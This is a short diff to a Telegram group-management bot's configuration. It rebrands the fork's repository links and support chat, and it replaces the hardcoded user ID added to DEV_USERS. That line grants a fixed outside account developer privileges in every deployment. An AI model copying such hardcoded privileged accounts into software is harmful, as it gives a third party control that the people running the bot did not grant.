@@ -1,5 +1,5 @@
-# https://github.com/Imshukla87/SHUKLA-ROBOT
-# https://github.com/Imshukla87
+# https://github.com/badhacker98/Broken_manegment
+# https://github.com/badhacker98 
 
 # <============================================== IMPORTS =========================================================>
 import asyncio
@@ -74,8 +74,8 @@ if ENV:
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI")
     NO_LOAD = os.environ.get("NO_LOAD", "").split()
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_ID = int(os.environ.get("SUPPORT_ID", "-100"))  # Support group id
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "mastiwithfriendsx")
+    SUPPORT_ID = int(os.environ.get("SUPPORT_ID", "-1002056907061"))  # Support group id
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "ll_THE_BAD_BOT_ll")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
 
@@ -171,7 +171,7 @@ else:
 # Add OWNER_ID to the DRAGONS and DEV_USERS sets
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(6762113050)
+DEV_USERS.add(6898413162)
 # <=======================================================================================================>
 
 # <============================================== INITIALIZE APPLICATION =========================================================>
